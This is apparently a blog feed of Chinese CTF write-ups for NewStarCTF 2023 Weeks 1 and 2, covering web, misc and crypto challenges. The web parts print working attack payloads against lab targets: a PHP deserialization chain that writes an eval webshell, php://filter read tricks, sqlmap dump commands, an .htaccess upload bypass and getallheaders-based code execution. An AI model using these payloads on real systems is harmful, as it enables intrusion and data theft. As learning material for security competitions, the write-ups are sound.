class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021806467.png"></p><h3 id="sseerriiaalliizzee"><a href="#sseerriiaalliizzee" class="headerlink" title="sseerriiaalliizzee"></a>sseerriiaalliizzee</h3><p>本题从题目看就是一道POC链 题目</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);class Start&#123;    public $barking;    public function __construct()&#123;        $this-&gt;barking &#x3D; new Flag;    &#125;    public function __toString()&#123;            return $this-&gt;barking-&gt;dosomething();    &#125;&#125;class CTF&#123;     public $part1;    public $part2;    public function __construct($part1&#x3D;&#39;&#39;,$part2&#x3D;&#39;&#39;) &#123;        $this -&gt; part1 &#x3D; $part1;        $this -&gt; part2 &#x3D; $part2;            &#125;    public function dosomething()&#123;        $useless   &#x3D; &#39;&lt;?php die(&quot;+Genshin Impact Start!+&quot;);?&gt;&#39;;        $useful&#x3D; $useless. $this-&gt;part2;        file_put_contents($this-&gt; part1,$useful);    &#125;&#125;class Flag&#123;    public function dosomething()&#123;        include(&#39;.&#x2F;flag,php&#39;);        return &quot;barking for fun!&quot;;    &#125;&#125;    $code&#x3D;$_POST[&#39;code&#39;];     if(isset($code))&#123;       echo unserialize($code);    &#125;    else&#123;        echo &quot;no way, fuck off&quot;;    &#125;?&gt; no way, fuck off<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>本题可以构造的POC链为</strong></p><p><strong>Start __construct() -&gt; Start __toString() -&gt; CTF dosomething()</strong></p><p>这其中我们需要考虑的是如何绕过CTF类中的$useless里面的die方法，如果使其执行，那么代码直接结束，我们想要写入的代码也无法写入，通过上网搜索，可以通过base编码来绕过</p><blockquote><p>原理其实很简单，利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别；</p><pre class="line-numbers language-none"><code class="language-none">$filename&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;s1mple.php&#39;;$content &#x3D; &#39;aPD9waHAgcGhwaW5mbygpOz8+&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里之所以将$content加了一个a，是因为base64在解码的时候是将4个字节转化为3个字节，又因为死亡代码只有phpexit参与了解码，所以补上一位就可以完全转化；载荷效果如下：</p></blockquote><p>具体详情可以看这位大佬博客<a href="https://xz.aliyun.com/t/8163">file_put_content和死亡·杂糅代码之缘 - 先知社区 (aliyun.com)</a></p><p>所以我们可以如此构造POC链</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$a &#x3D; new Start();$b &#x3D; new CTF();$a -&gt; barking &#x3D; $b;$b -&gt; part1 &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;1.php&quot;;$b -&gt; part2 &#x3D;  &#39;aa&#39;.base64_encode(&#39;&lt;?php eval($_POST[1]); ?&gt;&#39;);echo serialize($a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将序列化后的值传参进去</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021932320.png"></p><p>然后访问我们设置的php位置并输入相关查询指令</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311021936942.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB、学习、新手 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023NewStarCTF-Week2-部分WP</title>
      <link href="/2023/10/25/2023NewStarCTF-Week2-%E9%83%A8%E5%88%86WP/"/>
      <url>/2023/10/25/2023NewStarCTF-Week2-%E9%83%A8%E5%88%86WP/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h3><p>本题打开为一个js前端游戏，我们可以通过过关条件查询来找到flag所在位置（即本关需要100000分才可以得到flag）</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251514231.png"></p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251513016.png"></p><h3 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h3><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251514155.png"></p><p>本题需要我们通过伪协议读取，但是其过滤常见的base和rot读取，所以我们需要通过另一种方法来读取,即utf-8等之类的语言读取flag</p><p>构造payload</p><p><strong>url&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.utf-8.utf-16&#x2F;resource&#x3D;flag.php</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251904828.png"></p><p>官方payload：</p><p><u><strong>url&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-8.UTF-7&#x2F;resource&#x3D;flag.php</strong></u></p><h3 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251911937.png"></p><p>尝试发现有sql注入点，这里我选择用sqlmap一把梭了，如下</p><p><strong>指令–爆库:python sqlmap.py -u “<a href="http://a53a0a2a-cffd-4640-b678-fb674712e0b6.node4.buuoj.cn:81/?id=TMP0919">http://a53a0a2a-cffd-4640-b678-fb674712e0b6.node4.buuoj.cn:81/?id=TMP0919</a>“ –dbs –batch</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251915567.png"></p><p>猜测其在ctf中，继续下一项爆表</p><p><strong>指令–爆表:python sqlmap.py -u “<a href="http://a53a0a2a-cffd-4640-b678-fb674712e0b6.node4.buuoj.cn:81/?id=TMP0919">http://a53a0a2a-cffd-4640-b678-fb674712e0b6.node4.buuoj.cn:81/?id=TMP0919</a>“ -D ctf –tables –batch</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251916539.png"></p><p>显而易见在here_is_flag中，所以接下来爆列</p><p><strong>指令–爆列:python sqlmap.py -u “<a href="http://a53a0a2a-cffd-4640-b678-fb674712e0b6.node4.buuoj.cn:81/?id=TMP0919">http://a53a0a2a-cffd-4640-b678-fb674712e0b6.node4.buuoj.cn:81/?id=TMP0919</a>“ -D ctf -T here_is_flag –columns –batch</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251917023.png"></p><p>最后一项，爆flag列中字段</p><p><strong>指令–爆字段:python sqlmap.py -u “<a href="http://a53a0a2a-cffd-4640-b678-fb674712e0b6.node4.buuoj.cn:81/?id=TMP0919">http://a53a0a2a-cffd-4640-b678-fb674712e0b6.node4.buuoj.cn:81/?id=TMP0919</a>“ -D ctf -T here_is_flag -C flag –dump –batch</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251918273.png"></p><h3 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h3><p>打开本题连接可看到上述php代码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251921715.png"></p><p>在__destruct中过滤了一些常见看文件的命令，然后通过system执行该命令</p><p>先编写一个序列化，通过给$cmd赋值**ls &#x2F;**看看根目录下有哪些文件，这里的$cmd是被private保护的，所以如果为了避免private，可以选择将序列化后的结果加上urlencode，如下图</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251933811.png"></p><p>也可以在php编译器中将private改为public然后正常序列化输出</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251931550.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251932607.png"></p><p>可以看到里面有着<strong>th1s_1s_fffflllll4444aaaggggg</strong> 显而易见，flag就在其中，所以我们将**$cmd**的命令改变一下</p><p><strong>$cmd &#x3D; ‘uniq &#x2F;th1s_1s_fffflllll4444aaaggggg’;</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251934849.png"></p><h3 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h3><p>刚开始看到本题，我想着通过图片幻术头绕过检测，不过还是被其检测出来，说明问题出在后面的语句里，所以将其修改为另一种形式</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251944996.png"></p><p><strong>即：<script language="php">@eval($_POST['shell']);</script></strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251945983.png"></p><p>发现如此也还是不行，但jpg文件可以上传，那么这就需要用到.htaccess文件</p><p><strong>通过在其编写：AddType application&#x2F;x-httpd-php .jpg</strong>，让服务器对其当作php文件分析，</p><p>然后再通过蚁剑连接得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251947670.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251948686.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310251949393.png"></p><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310252018637.png"></p><p>打开后就只有这么一段话</p><p>使用dirsearch扫描从中扫到了.git，说明我们通过git源码泄露得到源码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310252027542.png"></p><p>再通过GitHack工具去获取源码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310252029377.png"></p><p>打开bo0g1pop.php文件，内容为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);if (&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;star&#39;])) &#123;    if(!preg_match(&#39;&#x2F;high|get_defined_vars|scandir|var_dump|read|file|php|curent|end&#x2F;i&#39;,$_GET[&#39;star&#39;]))&#123;        eval($_GET[&#39;star&#39;]);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据**’;’ &#x3D;&#x3D;&#x3D; preg_replace(‘&#x2F;[^\W]+((?R)?)&#x2F;‘, ‘’, $_GET[‘star’]**知晓其为无参数rce命令执行</p><p>然后接下来过滤了一些常用的用于无参数命令执行的 php 方法，但过滤不全，</p><p>通过BP抓包</p><p><strong>构造: url&#x2F;?bo0g1pop.php?star&#x3D;eval(next(getallheaders()));</strong></p><p><strong>官方: url&#x2F;?bo0g1pop.php?star&#x3D;eval(pos(array_reverse(getallheaders())));</strong> </p><p><code>getallheaders()</code> 函数用于从 HTTP 请求头中获取所有的头信息，然后调用 <code>next()</code> 函数返回数组中的下一个元素，并将其作为参数传递给 <code>eval()</code> 函数来执行 </p><p>执行中就User-Agent的回显，所以在User-Agent的头上写着命令执行的指令，从而得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310252041358.png"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="WebShell的利用"><a href="#WebShell的利用" class="headerlink" title="WebShell的利用"></a>WebShell的利用</h3><p>本题按官方wp进行复现</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$shell&#x3D;&quot;eval(str_rot13(convert_uudecode(str_rot13(base64_decode(&#39;编码太长，省略一下&#39;)))));&quot;;for($i&#x3D;0; $i&lt;50; $i++) &#123;        if(preg_match(&quot;&#x2F;base64&#x2F;&quot;,$shell)) &#123;                $tmp &#x3D; preg_replace(&quot;&#x2F;eval&#x2F;&quot;,&quot;return &quot;,$shell);                $shell &#x3D; eval($tmp);    &#125;    else&#123;                break;    &#125;&#125;echo $shell;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将其运行后可以得到<strong>get参和post参</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310252051221.png"></p><p>然后将其传参后进行命令执行</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310252053649.png"></p><h3 id="base"><a href="#base" class="headerlink" title="base!"></a>base!</h3><p>本题打开后就是一个里面充满着base64的txt文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310291904062.png"></p><p>将Base64解密出来就是一些诗的句子，考虑为Base64隐写，所以通过python代码解密可以得到flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import base64path &#x3D; input(&quot;请输入加密文件路径:&quot;)file &#x3D; open(path)a &#x3D; &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;aaa &#x3D; &#39;&#39;while True:    text &#x3D; file.readline()  # 只读取一行内容    # 判断是否读取到内容    text &#x3D; text.replace(&quot;\n&quot;, &quot;&quot;)    if not text:        break    if text.count(&#39;&#x3D;&#39;) &#x3D;&#x3D; 1:        aaa &#x3D; aaa + \            str(&#39;&#123;:02b&#125;&#39;.format((a.find(text[len(text)-2])) % 4))    if text.count(&#39;&#x3D;&#39;) &#x3D;&#x3D; 2:        aaa &#x3D; aaa + \            str(&#39;&#123;:04b&#125;&#39;.format((a.find(text[len(text)-3])) % 16))file.close()t &#x3D; &quot;&quot;ttt &#x3D; len(aaa)ttt &#x3D; ttt&#x2F;&#x2F;8*8for i in range(0,ttt,8):    t &#x3D; t + chr(int( aaa[i:i+8],2))print(t)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310291906217.png"></p><p>再将其值通过base58解密可以得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310291908539.png"></p><h3 id="1-序章"><a href="#1-序章" class="headerlink" title="1-序章"></a>1-序章</h3><p>本题通过复现官方WP所得，其所考的为SQL日志分析</p><p>从文件我们可以得到Web请求日志</p><pre class="line-numbers language-none"><code class="language-none">-1%20or%20if(ascii(substr((select%20group_concat(username,password)%20from%20user),1,1))&#x3D;40,sleep(1),1)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当其注入某一正确字符时会停止爆破，进入下一位的注入，例如下图中的109，110·····，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310291914795.png"></p><p>通过python脚本来跑出flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import reimport urllib.parse# 打开文件并读取数据with open(&#39;access.log&#39;, &#39;r&#39;) as f:    lines &#x3D; f.readlines()datas &#x3D; []# 解码URL并存储到datas列表中for line in lines:    t &#x3D; urllib.parse.unquote(line)    datas.append(t)flag_ascii &#x3D; &#123;&#125;# 使用正则表达式匹配数据并提取信息for data in datas:    matchObj &#x3D; re.search(r&#39;user\),(.*?),1\)\)&#x3D;(.*?),sleep&#39;, data)    if matchObj:        key &#x3D; int(matchObj.group(1))        value &#x3D; int(matchObj.group(2))        flag_ascii[key] &#x3D; valueflag &#x3D; &#39;&#39;# 构建flag字符串for value in flag_ascii.values():    flag +&#x3D; chr(value)print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310291916118.png"></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="滴啤"><a href="#滴啤" class="headerlink" title="滴啤"></a>滴啤</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from Crypto.Util.number import *n &#x3D; 93172788492926438327710592564562854206438712390394636149385608321800134934361353794206624031396988124455847768883785503795521389178814791213054124361007887496351504099772757164211666778414800698976335767027868761735533195880182982358937211282541379697714874313863354097646233575265223978310932841461535936931dp &#x3D; 307467153394842898333761625034462907680907310539113349710634557900919735848784017007186630645110812431448648273172817619775466967145608769260573615221635c &#x3D; 52777705692327501332528487168340175436832109866218597778822262268417075157567880409483079452903528883040715097136293765188858187142103081639134055997552543213589467751037524482578093572244313928030341356359989531451789166815462417484822009937089058352982739611755717666799278271494933382716633553199739292089e &#x3D; 65537r &#x3D; getPrime(64)pp &#x3D; pow(r, e*dp, n) - rp &#x3D; GCD(n, pp)q &#x3D; n &#x2F;&#x2F; pd &#x3D; inverse(e, (p-1)*(q-1))m &#x3D; pow(c, d, n)print(long_to_bytes(m))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>对于任意的小于p的非负自然数r, 有 r &#x3D; r^(e<em>dp) (mod p)   故 r^(e</em>dp) - r &#x3D; k*p,</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311011937323.png"></p><h3 id="rotate-xor"><a href="#rotate-xor" class="headerlink" title="rotate_xor"></a>rotate_xor</h3><p>原题</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311011939697.png"></p><p>解密代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from z3 import *from Crypto.Util.number import *from pwn import xorROUND &#x3D; 12s &#x3D; Solver()ciphertext &#x3D; b&#39;\x8dSyy\xd2\xce\xe2\xd2\x98\x0fth\x9a\xc6\x8e\xbc\xde&#96;zl\xc0\x85\xe0\xe4\xdfQlc&#39;enc_k1 &#x3D; BitVecVal(7318833940520128665, 64)k2 &#x3D; BitVecVal(9982833494309156947, 64)k1 &#x3D; BitVec(&#39;k1&#39;, 64)def encrypt_key(key):  for _ in range(ROUND):      key &#x3D; RotateLeft(key, 3) ^ k2  return keys.add(enc_k1 &#x3D;&#x3D; encrypt_key(k1))s.check()k1 &#x3D; s.model()[k1].as_long()flag &#x3D; xor(ciphertext, long_to_bytes(k1))print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311011941508.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB、学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023NewStarCTF-Week1-WP</title>
      <link href="/2023/10/08/2023NewStarCTF-Week1-%E9%83%A8%E5%88%86WP/"/>
      <url>/2023/10/08/2023NewStarCTF-Week1-%E9%83%A8%E5%88%86WP/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret"></a>CyberChef’s Secret</h3><p>本题就是MISC的签到题，打开后是一串base编码，</p><blockquote><p>M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA&#x3D;</p></blockquote><p>放入随波逐流中解密</p><p>该代码经历了base32-base58-base64 然后得到正确flag</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081906714.png"></p><h3 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h3><p>本题打开是一张二维码图片，先用CQR扫描看看里面有什么</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081916262.png"></p><p>说明考点并不在这，用010打开也没有得到有效信息，那就用StegSolve打开图片，在Data Extract将RGB都调到最低，得到flag</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081921280.png"></p><h3 id="流量！鲨鱼！"><a href="#流量！鲨鱼！" class="headerlink" title="流量！鲨鱼！"></a>流量！鲨鱼！</h3><p>打开后得到一个pcapng文件，里面很多http请求，将其通过WireShark导出</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081932502.png"></p><p>发现可疑包</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081934421.png"></p><p>追踪HTTP流发现里面有一串base代码</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081935327.png"></p><p>放入随波逐流base64解密俩次得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081936508.png"></p><h3 id="压缩包们"><a href="#压缩包们" class="headerlink" title="压缩包们"></a>压缩包们</h3><p>打开得到一个空白文件，通过010打开发现其是一个压缩包文件且文件头错误，将文件头修改</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081938198.png"></p><p>得到的压缩包里面包含着一个压缩包，解压后发现里面的txt文件需要密码才能打开，且有一段base代码的注释，解密后得到提示</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081940657.png"></p><p>说明可以通过爆破来得到txt文件里面的flag，通过Ziperello进行爆破，得到密码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081944309.png"></p><p>打开txt文件得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081945006.png"></p><h3 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h3><p>打开后就是一面空白，且通过Ctrl+A全选发现其没有规则，不考虑考morse的可能，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081948411.png"></p><p>经过上网搜索学习，发现其考点为Whitespace语言，解密后得到flag</p><p>解密网站<a href="https://www.w3cschool.cn/tryrun/runcode?lang=whitespace">whitespace在线运行,在线工具，在线编译IDE_w3cschool</a></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081949793.png"></p><h3 id="隐秘的眼睛"><a href="#隐秘的眼睛" class="headerlink" title="隐秘的眼睛"></a>隐秘的眼睛</h3><p>根据题目与所给图片提示，可知是SilentEye隐写，利用SilentEye工具Decode俩次得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081953334.png"></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>打开网站提示管理员泄露俩个敏感信息</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081955208.png"></p><p>通过python脚本尝试一下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import requestsif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    # url为被扫描地址，后不加‘&#x2F;’    url1 &#x3D; &#39;http:&#x2F;&#x2F;4b6a43da-9744-47e0-b78d-7c4889a38fc2.node4.buuoj.cn:81&#x2F;&#39;    # 常见的网站源码备份文件名    list1 &#x3D; [&#39;web&#39;, &#39;website&#39;, &#39;backup&#39;, &#39;back&#39;, &#39;www&#39;, &#39;wwwroot&#39;, &#39;temp&#39;]    # 常见的网站源码备份文件后缀    list2 &#x3D; [&#39;tar&#39;, &#39;tar.gz&#39;, &#39;zip&#39;, &#39;rar&#39;]    for i in list1:        for j in list2:            back &#x3D; str(i) + &#39;.&#39; + str(j)            url &#x3D; str(url1) + &#39;&#x2F;&#39; + back            print(back + &#39;    &#39;, end&#x3D;&#39;&#39;)            print(requests.get(url).status_code)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现<a href="http://www.zip可以访问成功,/">www.zip可以访问成功，</a></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081956429.png"></p><p>下载后得到俩个敏感信息</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081957368.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081957461.png"></p><h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><p>如题目所述，一个简单的上传题，无法直接上传php文件，所以先上传一个写有一句话木马的jpg图片类型的文件并通过BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082001955.png"></p><p>将其后缀修改为.php再发送</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082002387.png"></p><p>然后通过蚁剑连接从根目录下得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082003013.png"></p><h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><h4 id="第一步-Get传参"><a href="#第一步-Get传参" class="headerlink" title="第一步 Get传参"></a>第一步 Get传参</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082004890.png"></p><h4 id="第二步-POST传参"><a href="#第二步-POST传参" class="headerlink" title="第二步 POST传参"></a>第二步 POST传参</h4><p>secret被藏在调试器中</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082006530.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082006519.png"></p><p>POST传参后进入下一步并抓包</p><h4 id="第三步-修改COOKIE"><a href="#第三步-修改COOKIE" class="headerlink" title="第三步 修改COOKIE"></a>第三步 修改COOKIE</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082007404.png"></p><p>此时我们的power为hacker，将其修改为ctfer即可进入下一步</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082008737.png"></p><h4 id="第四步-浏览器修改"><a href="#第四步-浏览器修改" class="headerlink" title="第四步 浏览器修改"></a>第四步 浏览器修改</h4><p>即将User-Agent内容修改为NewStarCTF2023即可进入下一步</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082009487.png"></p><h4 id="第五步-增加访问所需网站"><a href="#第五步-增加访问所需网站" class="headerlink" title="第五步 增加访问所需网站"></a>第五步 增加访问所需网站</h4><p>即将Referer中的内容修改为newstarctf.com即可进入下一步</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082011914.png"></p><h4 id="第六步-Fake-IP"><a href="#第六步-Fake-IP" class="headerlink" title="第六步 Fake IP"></a>第六步 Fake IP</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082011184.png"></p><h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>看到flask我想到了ssti注入，通过ssti注入得到flag</p><p>即<strong>url+?number1&#x3D;1&amp;number2&#x3D;2</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082013926.png"></p><h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082014538.png"></p><p>很简单的MD5弱类型比较</p><blockquote><p>构造Payload url+?key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708 </p></blockquote><h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h4><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082016322.png"></p><p>第二关可以通过数组绕过，php哈希函数的特性，当处理数组类型的传参时其会返回null，则就形成了null&#x3D;null满足了强等于的条件</p><blockquote><p>构造Payload url+?key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708 </p><p>POST：key3[]&#x3D;1</p></blockquote><h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082018232.png"></p><p>strcmp函数特性，当传入的参数为数组时即返回null，即传入key4为数组，则返回null，null&#x3D;0符合其条件</p><blockquote><p>构造Payload 